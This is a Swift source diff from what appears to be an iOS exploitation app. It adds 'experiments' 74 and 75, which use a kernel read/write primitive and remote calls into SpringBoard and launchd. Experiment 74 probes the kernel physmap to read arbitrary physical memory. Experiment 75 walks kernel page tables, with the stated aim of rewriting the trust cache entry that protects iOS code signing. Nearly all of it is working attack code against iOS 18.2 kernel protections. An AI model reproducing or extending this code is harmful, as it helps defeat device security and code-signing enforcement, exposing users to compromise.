@@ -53,7 +53,7 @@ struct AMFIExperimentView: View {
             Section {
                 Button(action: runAllExperiments) {
                     HStack {
-                        Label("Run All (Exp 54-59)", systemImage: "play.circle.fill")
+                        Label("Run All (Exp 54-75)", systemImage: "play.circle.fill")
                             .foregroundStyle(isRunning ? .gray : .red)
                         Spacer()
                         if isRunning && runningLabel.contains("All") {
@@ -141,7 +141,7 @@ struct AMFIExperimentView: View {
     
     private func runAllExperiments() {
         isRunning = true
-        runningLabel = "All Experiments (54-59)..."
+        runningLabel = "All Experiments (54-75)..."
         results.removeAll()
         
         #if !DISABLE_REMOTECALL
@@ -291,6 +291,23 @@ struct AMFIExperimentView: View {
             // ============================================
             let exp73 = self.expHeapSpray()
             experimentResults.append(exp73)
+            
+            // ============================================
+            // Experiment 74: Physmap Direct Access
+            // Kernel has a 1:1 virtual mapping of ALL physical RAM
+            // If we find physmap base → read trust cache via physmap!
+            // Socket KRW zone doesn't matter — physmap is in __DATA
+            // ============================================
+            let exp74 = self.expPhysmapAccess(rc: rc)
+            experimentResults.append(exp74)
+            
+            // ============================================
+            // Experiment 75: PTE Remap Attack
+            // Walk page tables → find trust cache PTE → modify mapping
+            // Remap trust cache physical page to our controlled VA
+            // ============================================
+            let exp75 = self.expPTERemap(rc: rc)
+            experimentResults.append(exp75)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -3585,6 +3602,384 @@ struct AMFIExperimentView: View {
         
         let success = postSprayFound || markerFound
         return ExperimentResult(name: "Heap Spray (Exp 73)", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 74: Physmap Direct Access
+    
+    /// The kernel maintains a 1:1 virtual mapping of ALL physical RAM (physmap).
+    /// Formula: physmap_virt = physmap_base + physical_address
+    /// If we can find physmap_base, we can read/write ANY physical address
+    /// through the kernel's own virtual mapping — bypassing zone isolation!
+    ///
+    /// Key insight: physmap is in kernel __DATA region, NOT in a PPL-protected zone.
+    /// Our socket KRW might be able to read it IF the address falls in our zone.
+    /// Alternative: use the known gPhysBase/gVirtBase to calculate.
+    ///
+    /// On A12 iOS 18.2:
+    ///   physmap_base ≈ 0xfffffff000000000 (gVirtBase) - 0x800000000 (gPhysBase) + kernel_base
+    ///   OR: physmap is at a fixed offset from kernel base
+    private func expPhysmapAccess(rc: RemoteCall) -> ExperimentResult {
+        var detail = "Experiment 74: Physmap Direct Access\n"
+        detail += "=====================================\n\n"
+        
+        // Step 1: Get kernel base and slide
+        let kernBase = ds_get_kernel_base()
+        let kernSlide = ds_get_kernel_slide()
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
+        
+        // Step 2: Calculate potential physmap base addresses
+        // On iOS, the physmap (direct map of physical RAM) is typically:
+        // - At gVirtBase (which maps physical 0x0 to some virtual address)
+        // - Formula: virt_for_phys(pa) = pa - gPhysBase + gVirtBase
+        //
+        // Known values from exp 72:
+        //   gPhysBase = 0x800000000 (DRAM start on A12)
+        //   gVirtBase = 0xfffffff000000000 (estimated)
+        //
+        // But the REAL physmap might be different. Let's probe.
+        
+        let gPhysBase: UInt64 = 0x800000000
+        // gVirtBase is typically kernBase rounded down, or a known constant
+        // On iOS 18, it's often: 0xfffffff000000000 + slide
+        let gVirtBase: UInt64 = 0xfffffff000000000 + kernSlide
+        
+        detail += "Estimated gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
+        detail += "Estimated gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n\n"
+        
+        // Step 3: We know PurpleGfxMem physical address = 0x10000000 (from exp 71)
+        // If physmap works: reading (gVirtBase + 0x10000000 - gPhysBase) should give us
+        // the same data we wrote to PurpleGfxMem!
+        
+        // First, write a unique marker to PurpleGfxMem via SpringBoard
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "Physmap Access", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
+        let nsNumClass = remote_getClass(sb, "NSNumber")
+        let numWithInt = remote_sel(sb, "numberWithInteger:")
+        let dictNew = remote_sel(sb, "new")
+        let setObj = remote_sel(sb, "setObject:forKey:")
+        
+        // Create PurpleGfxMem surface
+        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
+        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
+        
+        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
+        guard gfxSurface != 0 else {
+            detail += "Cannot create PurpleGfxMem surface\n"
+            return ExperimentResult(name: "Physmap Access", success: false, detail: detail, timestamp: Date())
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
+        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
+        
+        guard gfxBase != 0 else {
+            detail += "GfxMem base is NULL\n"
+            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+            return ExperimentResult(name: "Physmap Access", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Write unique marker
+        let physmapMarker: UInt64 = 0x5048313553_4D4150  // "PH15MAP" in hex-ASCII
+        sb[gfxBase].setValue64(physmapMarker)
+        sb[gfxBase + 8].setValue64(0x7465737430303734)  // "test0074"
+        
+        // Read back to confirm
+        let readBack = sb[gfxBase].value64()
+        detail += "GfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
+        detail += "Marker written: 0x\(String(format: "%llx", readBack))\n\n"
+        
+        // Step 4: Try multiple physmap base candidates
+        // The physmap maps physical address PA to virtual address (physmap_base + PA)
+        // We need to find physmap_base such that reading (physmap_base + gfxPhysAddr)
+        // returns our marker.
+        
+        // Known: GfxMem physical addr from exp 71 was 0x10000000
+        // But it changes per boot. We need to find it dynamically.
+        // IOSurfaceGetPhysicalAddress might work:
+        let ioGetPhysAddr = RootExecutor.rcall(sb, "dlsym", UInt64(bitPattern: -2), remote_alloc_str(sb, "IOSurfaceGetPropertyMaximum"))
+        detail += "IOSurfaceGetPropertyMaximum: 0x\(String(format: "%llx", ioGetPhysAddr))\n"
+        
+        // Alternative: scan known physmap base candidates
+        detail += "\n=== Probing physmap base candidates ===\n"
+        
+        // Common physmap base patterns on iOS:
+        // 1. gVirtBase directly (maps phys 0x0 → gVirtBase)
+        // 2. Kernel base - some offset
+        // 3. Fixed address like 0xfffffff000000000
+        
+        // Since we can't easily get the GfxMem physical address dynamically,
+        // let's try a different approach: use our KNOWN kernel addresses.
+        //
+        // We know: our proc is at virtual address X (readable via KRW)
+        // If we can walk the page table to find proc's physical address,
+        // then: physmap_base = proc_virt - proc_phys (if physmap covers kernel heap)
+        
+        // Actually, simpler approach: the kernel's physmap maps ALL of DRAM.
+        // phystokv(pa) = pa - gPhysBase + gVirtBase
+        // kvtophys(va) = va - gVirtBase + gPhysBase
+        //
+        // So if we know a kernel VA and its physical address, we can verify.
+        // We already know PurpleGfxMem phys = 0x10000000 (from exp 71).
+        // Let's try: physmap_va_of_gfxmem = 0x10000000 - gPhysBase + gVirtBase
+        
+        let gfxPhysFromExp71: UInt64 = 0x10000000  // From experiment 71
+        let physmapVA = gfxPhysFromExp71 - gPhysBase + gVirtBase
+        detail += "Expected physmap VA for GfxMem: 0x\(String(format: "%llx", physmapVA))\n"
+        
+        // Try to read this address via socket KRW
+        let physmapRead = ds_kread64_safe(physmapVA)
+        detail += "Read via KRW at physmap VA: 0x\(String(format: "%llx", physmapRead))\n"
+        
+        if physmapRead == readBack {
+            detail += "\n🎉🎉🎉 PHYSMAP ACCESS CONFIRMED! 🎉🎉🎉\n"
+            detail += "We can read physical memory via kernel physmap!\n"
+            detail += "Zone isolation BYPASSED — physmap covers ALL RAM!\n\n"
+            detail += "Next: find trust cache physical address → read via physmap → write CDHash!\n"
+        } else if physmapRead != 0 {
+            detail += "Value doesn't match marker — physmap base might be different\n"
+            detail += "Or GfxMem physical address changed since exp 71\n\n"
+            
+            // Try alternative: scan around the estimated physmap VA
+            detail += "Scanning nearby addresses...\n"
+            var found = false
+            for delta in stride(from: Int64(-0x10000), to: Int64(0x10000), by: 0x1000) {
+                let probeAddr = UInt64(Int64(physmapVA) + delta)
+                let val = ds_kread64_safe(probeAddr)
+                if val == readBack {
+                    detail += "🎯 FOUND at offset \(delta): 0x\(String(format: "%llx", probeAddr))\n"
+                    detail += "Actual physmap base: 0x\(String(format: "%llx", probeAddr - gfxPhysFromExp71))\n"
+                    found = true
+                    break
+                }
+            }
+            if !found {
+                detail += "Not found in ±64KB range\n"
+            }
+        } else {
+            detail += "Read returned 0 — address not in KRW-accessible zone\n"
+            detail += "Physmap region might be in a different zone than socket KRW can reach\n\n"
+            
+            // Alternative approach: try reading physmap via RemoteCall (launchd context)
+            detail += "=== Trying via RemoteCall (launchd) ===\n"
+            let mem = rc.trojanMem
+            
+            // Use memcpy in launchd to read from physmap VA
+            // This won't work directly because physmap is kernel VA, not user VA
+            // But we can try vm_read_overwrite from launchd (has task_for_pid-like access?)
+            
+            // Actually, the correct approach is:
+            // Our socket KRW IS reading kernel virtual addresses.
+            // If physmap VA returns 0, it means either:
+            // a) The address is not mapped (wrong physmap base)
+            // b) Socket KRW zone check blocks it
+            
+            // Let's try with different gVirtBase estimates
+            let candidates: [(String, UInt64)] = [
+                ("gVirtBase=kernBase", kernBase),
+                ("gVirtBase=0xfffffff000000000", 0xfffffff000000000),
+                ("gVirtBase=0xfffffff000000000+slide", 0xfffffff000000000 + kernSlide),
+                ("gVirtBase=kernBase-0x4000", kernBase - 0x4000),
+                ("gVirtBase=kernBase&~0xFFF", kernBase & ~0xFFF),
+            ]
+            
+            for (name, vBase) in candidates {
+                let testVA = gfxPhysFromExp71 - gPhysBase + vBase
+                let val = ds_kread64_safe(testVA)
+                detail += "  \(name): VA=0x\(String(format: "%llx", testVA)) → 0x\(String(format: "%llx", val))"
+                if val == readBack {
+                    detail += " ✅ MATCH!"
+                }
+                detail += "\n"
+            }
+        }
+        
+        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
+        
+        let success = detail.contains("PHYSMAP ACCESS CONFIRMED") || detail.contains("MATCH!")
+        return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - Experiment 75: PTE Remap Attack
+    
+    /// Walk kernel page tables to find trust cache's Page Table Entry (PTE).
+    /// If we can MODIFY the PTE to point to our controlled physical page,
+    /// the kernel will read OUR data when it accesses trust cache!
+    ///
+    /// Attack flow:
+    /// 1. Find pmap_cs/trust_cache virtual address (known from KRW)
+    /// 2. Walk L1→L2→L3 page tables to find the PTE
+    /// 3. Read PTE to get physical page number
+    /// 4. Try to WRITE PTE to point to PurpleGfxMem physical page
+    /// 5. If write succeeds → kernel reads our fake trust cache!
+    ///
+    /// Risk: PPL protects page tables. Writing PTE will likely panic.
+    /// But: we need to TEST if socket KRW can reach page table zone.
+    private func expPTERemap(rc: RemoteCall) -> ExperimentResult {
+        var detail = "Experiment 75: PTE Remap Attack\n"
+        detail += "================================\n\n"
+        
+        // Step 1: Get kernel pmap (page table root)
+        let kernBase = ds_get_kernel_base()
+        let kernSlide = ds_get_kernel_slide()
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
+        
+        // Step 2: Find kernel_pmap address
+        // kernel_pmap is a global variable in __DATA
+        // On iOS 18.2 A12, it's at a known offset from kernel base
+        // We can find it by reading the pmap pointer from our task struct
+        
+        let ourTask = ds_get_our_task()
+        detail += "Our task: 0x\(String(format: "%llx", ourTask))\n"
+        
+        // task->map is at offset ~0x28, map->pmap is at offset ~0x48
+        let vmMap = ds_kread64(ourTask + 0x28)
+        detail += "VM map: 0x\(String(format: "%llx", vmMap))\n"
+        
+        // pmap is at different offset depending on iOS version
+        // Try common offsets: 0x48, 0x40, 0x50
+        var kernelPmap: UInt64 = 0
+        let pmapOffsets: [UInt64] = [0x48, 0x40, 0x50, 0x58, 0x30]
+        
+        for off in pmapOffsets {
+            let candidate = ds_kread64_safe(vmMap + off)
+            // Valid pmap should be a kernel pointer (0xfffffff...)
+            if candidate > 0xfffffff000000000 && candidate < 0xffffffffffffffff {
+                // Verify: pmap->tte should also be a valid kernel pointer
+                let tte = ds_kread64_safe(candidate + 0x08)
+                if tte > 0xfffffff000000000 || (tte > 0x800000000 && tte < 0x900000000) {
+                    kernelPmap = candidate
+                    detail += "Found pmap at map+0x\(String(format: "%llx", off)): 0x\(String(format: "%llx", candidate))\n"
+                    detail += "  TTB (translation table base): 0x\(String(format: "%llx", tte))\n"
+                    break
+                }
+            }
+        }
+        
+        guard kernelPmap != 0 else {
+            detail += "Could not find kernel pmap\n"
+            detail += "Tried offsets from vm_map: \(pmapOffsets.map { "0x\(String(format: "%x", $0))" }.joined(separator: ", "))\n"
+            return ExperimentResult(name: "PTE Remap (Exp 75)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // Step 3: Read the translation table base register (TTBR)
+        let ttbr = ds_kread64_safe(kernelPmap + 0x08)
+        detail += "\nTTBR (page table root): 0x\(String(format: "%llx", ttbr))\n"
+        
+        // Note: TTBR might be a physical address on some configs
+        // On A12, kernel page tables are in a PPL-protected region
+        // Let's try to read L1 entries
+        
+        // Step 4: Walk page table for a KNOWN kernel address (our proc)
+        let ourProc = ds_get_our_proc()
+        detail += "\n=== Walking page table for proc (0x\(String(format: "%llx", ourProc))) ===\n"
+        
+        // L1 index: bits [47:30] (or [38:30] for 39-bit VA)
+        // iOS uses 39-bit virtual addresses with 16KB pages (14-bit offset)
+        // L1: bits [38:36] (3 bits, 8 entries) — wait, 16KB granule:
+        // Actually iOS 18 A12 uses 16KB pages:
+        //   L0: not used (48-bit only)
+        //   L1: bits [47:36] → 4096 entries (but only 39-bit VA → bits [38:36] = 8 entries)
+        //   L2: bits [35:25] → 2048 entries
+        //   L3: bits [24:14] → 2048 entries
+        //   Page offset: bits [13:0] → 16KB
+        
+        // For 16KB granule, 39-bit VA:
+        // L1 index: (va >> 36) & 0x7  (3 bits)
+        // L2 index: (va >> 25) & 0x7FF (11 bits)
+        // L3 index: (va >> 14) & 0x7FF (11 bits)
+        
+        let va = ourProc
+        let l1Idx = (va >> 36) & 0x7
+        let l2Idx = (va >> 25) & 0x7FF
+        let l3Idx = (va >> 14) & 0x7FF
+        
+        detail += "VA decomposition (16KB granule):\n"
+        detail += "  L1 index: \(l1Idx)\n"
+        detail += "  L2 index: \(l2Idx)\n"
+        detail += "  L3 index: \(l3Idx)\n"
+        detail += "  Page offset: 0x\(String(format: "%llx", va & 0x3FFF))\n\n"
+        
+        // Try to read L1 entry
+        // TTBR might be physical or virtual — try both
+        let l1EntryAddr = ttbr + l1Idx * 8
+        let l1Entry = ds_kread64_safe(l1EntryAddr)
+        detail += "L1 entry at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"
+        
+        if l1Entry == 0 {
+            detail += "L1 entry is 0 — TTBR might be physical address (not readable via KRW)\n"
+            detail += "Page tables are likely in PPL-protected zone\n\n"
+            
+            // Try: TTBR as physical address, convert to virtual via physmap
+            let gPhysBase: UInt64 = 0x800000000
+            let gVirtBase: UInt64 = 0xfffffff000000000 + kernSlide
+            
+            if ttbr > gPhysBase && ttbr < gPhysBase + 0x400000000 {
+                let ttbrVirt = ttbr - gPhysBase + gVirtBase
+                detail += "TTBR as phys → virt: 0x\(String(format: "%llx", ttbrVirt))\n"
+                let l1FromPhysmap = ds_kread64_safe(ttbrVirt + l1Idx * 8)
+                detail += "L1 via physmap: 0x\(String(format: "%llx", l1FromPhysmap))\n"
+                
+                if l1FromPhysmap != 0 {
+                    detail += "✅ Page table readable via physmap!\n"
+                }
+            }
+        } else {
+            // L1 entry is valid! Decode it
+            let l1Valid = (l1Entry & 0x1) != 0
+            let l1Table = (l1Entry & 0x2) != 0
+            let l1OutputAddr = l1Entry & 0x0000FFFFFFFFF000  // bits [47:12] for table
+            
+            detail += "  Valid: \(l1Valid), Table: \(l1Table)\n"
+            detail += "  Output addr: 0x\(String(format: "%llx", l1OutputAddr))\n"
+            
+            if l1Valid && l1Table {
+                // Read L2 entry
+                let l2EntryAddr = l1OutputAddr + l2Idx * 8
+                let l2Entry = ds_kread64_safe(l2EntryAddr)
+                detail += "\nL2 entry at 0x\(String(format: "%llx", l2EntryAddr)): 0x\(String(format: "%llx", l2Entry))\n"
+                
+                if l2Entry != 0 {
+                    let l2Valid = (l2Entry & 0x1) != 0
+                    let l2Table = (l2Entry & 0x2) != 0
+                    let l2OutputAddr = l2Entry & 0x0000FFFFFFFFF000
+                    
+                    detail += "  Valid: \(l2Valid), Table: \(l2Table)\n"
+                    detail += "  Output addr: 0x\(String(format: "%llx", l2OutputAddr))\n"
+                    
+                    if l2Valid && l2Table {
+                        // Read L3 entry (final page)
+                        let l3EntryAddr = l2OutputAddr + l3Idx * 8
+                        let l3Entry = ds_kread64_safe(l3EntryAddr)
+                        detail += "\nL3 entry at 0x\(String(format: "%llx", l3EntryAddr)): 0x\(String(format: "%llx", l3Entry))\n"
+                        
+                        if l3Entry != 0 {
+                            let l3Valid = (l3Entry & 0x1) != 0
+                            let l3PhysPage = l3Entry & 0x0000FFFFFFFC0000  // 16KB aligned
+                            let l3AP = (l3Entry >> 6) & 0x3  // Access permissions
+                            
+                            detail += "  Valid: \(l3Valid)\n"
+                            detail += "  Physical page: 0x\(String(format: "%llx", l3PhysPage))\n"
+                            detail += "  AP (access): \(l3AP) (\(l3AP == 0 ? "EL1 RW" : l3AP == 1 ? "RW" : l3AP == 2 ? "EL1 RO" : "RO"))\n"
+                            
+                            detail += "\n✅ PAGE TABLE WALK SUCCESSFUL!\n"
+                            detail += "proc physical address: 0x\(String(format: "%llx", l3PhysPage | (va & 0x3FFF)))\n"
+                            detail += "\nThis means we CAN read page tables via socket KRW!\n"
+                            detail += "Next: walk page table for trust cache VA → get its PTE\n"
+                            detail += "Then: try to WRITE PTE (will likely panic due to PPL)\n"
+                            detail += "But: if write succeeds → we control trust cache mapping!\n"
+                        }
+                    }
+                }
+            }
+        }
+        
+        let success = detail.contains("PAGE TABLE WALK SUCCESSFUL") || detail.contains("Page table readable via physmap")
+        return ExperimentResult(name: "PTE Remap (Exp 75)", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
